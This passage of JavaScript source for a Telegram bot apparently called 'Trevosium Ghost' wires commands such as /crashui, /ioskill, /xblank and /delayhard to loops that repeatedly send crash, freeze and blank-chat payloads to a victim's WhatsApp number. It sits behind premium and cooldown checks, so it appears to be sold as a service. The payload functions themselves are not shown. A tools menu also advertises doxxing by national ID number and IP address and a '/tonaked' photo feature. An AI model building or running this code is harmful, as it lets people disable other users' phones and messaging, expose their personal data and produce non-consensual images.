    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/blank', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═━━【BLANK OPTIONS】━━═⬡</pre></blockquote>
⌬ /xblank ✆ 628xx
╰⊱ |[ Blank Chat Stiker ]|
⌬ /overdocu ✆ 628xx 
╰⊱ |[ Blank Chat Documents ]|
⌬ /blankios ✆ 62xx
╰⊱ |[ Blank Chat Click iPhone ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/forclose', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═━━【FORCLOSE OPTIONS】━━═⬡</pre></blockquote>
⌬ /xflower ✆ 62xx
╰⊱ |[ Forclose Can Spam ]|
⌬ /avicix ✆ 62xx
╰⊱ |[ Forclose Click Hard ]|
⌬ /filixer ✆ 62xx
╰⊱ |[ Forclose Infinity Invisible ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/crash', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═━━【CRASH OPTIONS】━━═⬡</pre></blockquote>
⌬ /crashui ✆ 62xx
╰⊱ |[ Crash Ui Not Work All Device ]|
⌬ /ioskill ✆ 628xx 
╰⊱ |[ Crash Invisible iPhone ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/group', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═━━【KILL GROUP】━━═⬡</pre></blockquote>
⌬ /crashgroup ✆ Link Group
╰⊱ |[ Forclose Group Click ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const bugMenu2 = `
<blockquote><pre>⬡═━━【TOOLS MENU】━━═⬡</pre></blockquote>
⌬ /tiktokdl - Input Link
⌬ /tiktoksearch - Input Text
⌬ /nikparse - Input Number NIK
⌬ /doxxingip - Input Number IP
⌬ /ssip - Input Text
⌬ /tourl - Reply Photo/Video
⌬ /cekbio - Number
⌬ /toanime - Reply Photo
⌬ /anime - Input Text Anime
⌬ /tonaked - Reply Photo
⌬ /bokep - Input Text
⌬ /brat - Input Text
⌬ /tofigure - Reply Photo
⌬ /play - Input Text
⌬ /getcode - Input Link
⌬ /testfunction - Reply Function
<blockquote>╘═─────────────────═▣</blockquote>
`;

   const keyboard = [
  [ 
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/bug" },
    { text: "ᖫ ɴᴇxᴛ ⟹ ᖭ", callback_data: "/tqto" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu2, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote><pre>╭━━⊱『 THANKS TO 』</pre></blockquote>
ᝰ Xavienzz ⧼ᴅᴇᴠᴇʟᴏᴘᴇʀ⧽
ᝰ Xwarr ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Hamzz ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Zephyrine ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Xatanical ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Otaa ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Zenifer ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ ᴀʟʟ ᴛᴇᴀᴍ ᴛʀᴇᴠᴏꜱɪᴜᴍ ɢʜᴏꜱᴛ
<blockquote>༺━━━━━━━━━━━━━━━༻</blockquote>
`;

    const keyboard = [
  [
    { text: "ᖫ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᖭ", callback_data: "/start" }
  ]
];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("lightdelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
 
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("📋 Format: <code>/lightdelay 62×××</code>", { parse_mode: "HTML" });

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    if (!checkGroupOnly(ctx)) return;


    const processMessage = await ctx.reply(
      `<b> LIGHT DELAY PROTOCOL</b>

<blockquote expandable>⚙️ Initializing Light Delay System
📞 Target: <code>${q}</code>
🔧 Mode: Sequential Multi-Payload
🛡️ Status: <i>Encrypted & Secured</i></blockquote>

<code>━━━━━━━━━━━━━━━━━</code>
⏳ <i>Preparing 15-cycle execution matrix...</i>`,
      { parse_mode: "HTML" }
    );

    const processMessageId = processMessage.message_id;


    for (let i = 0; i < 20; i++) {    
      await DelaySpamLolipop(sock, target);
      await sleep(5500);
      await invisibledelaynew(sock, target);
      await sleep(5500);
      await CarouselDelayOtax(sock, target);
      await sleep(5500);
      await ExploitDelayV1(sock, target);
      await sleep(5500);
      await Xinvisdad(target, false);
      await sleep(15500);
    }


    await ctx.telegram.editMessageText(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<b>✅ LIGHT DELAY COMPLETED</b>

<blockquote expandable>🎯 Target: <code>${q}</code>
🔄 Cycles: 15
📦 Payloads: Multi-Variant
⏱️ Duration: Optimized</blockquote>

<code>━━━━━━━━━━━━━━━━━</code>
  <i>Light Delay protocol executed successfully.
All payloads delivered with precision.</i>

<b>🛡️ System Ready for Next Operation</b>`,
      { parse_mode: "HTML" }
    );
  }
);

bot.command("delayhard", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delayhard 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Invisible Hard
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Invisible Hard
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 45; i++) {
    await delaytriger(sock, target);
    await sleep(8500);
    await newCatalog(target);
    await sleep(8500);
    await HardCore(sock, target);
    await sleep(8500);
    await audioXnxx(sock, target);
    await sleep(8500);
    await gsIntjavgb(sock, target, otaxkiw = true);
    await sleep(8500);
    await OtaxAyunBelovedX(sock, target, false);
    await sleep(15000);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Invisible Hard
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xblank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 15; i++) {
    await StikerFreeze(target);
    await sleep(7500);
    await stcPckx(sock, target);
    await sleep(15000);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Android
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("crashui", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashui 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Ui Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Ui Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 25; i++) {
    await killeruimsg(sock, target);
    await sleep(7500);
    await CrashUI(sock, target);
    await sleep(7500);
    await NotifUi(target);
    await sleep(7500);
    await Notifcrash(sock, target);
    await sleep(7500);
    await notifandroid(sock, target);
    await sleep(7500);
    await Lontionwolker(target);
    await sleep(7500);
    await docUI(sock, target);
    await sleep(15000);
    }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash Ui Android
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ioskill 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash iPhone Invisible
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash iPhone Invisible
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 30; i++) {
    await InvisibleIphone(target);
    await sleep(7580);
    await TrashLocaIos(target);
    await sleep(7580);
    await exoticsIPV2(sock, target);
    await sleep(7580);
    await IpongSepong(sock, target);
    await sleep(7580);
    await HyperSixty(target, false);
    await sleep(15000);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Crash iPhone Invisible
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("avicix", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /avicix 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Click Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Click Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 8; i++) {
    await LocationClick(sock, target);
    await sleep(15000);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Click Android
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("overdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /overdocu 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Document Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Document Android
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 25; i++) {
    await otaxnewdocu(sock, target);
    await sleep(8500);
    await otaxnewdocu2(sock, target);
    await sleep(15000);
    }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Document Android
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("filixer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /filixer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Infinity Invisible
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Infinity Invisible
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 145; i++) {
    await croserds(sock, target);;
    await sleep(2550);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Forclose Infinity Invisible
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("voxtrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /voxtrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Blank Chat Visible
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Blank Chat Visible
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 20; i++) {
    await eventFlowres(target);
    await sleep(7500);
    await blnkmark(target);
    await sleep(7500);
    await Delaytop1(target);
    await sleep(7500);
    await gsIntjav(sock, target, otaxkiw = true);
    await sleep(7500);
    await DelayBlank(sock, target);
    await sleep(15000);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Blank Chat Visible
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("blankios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /blankios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat iPhone
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat iPhone
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
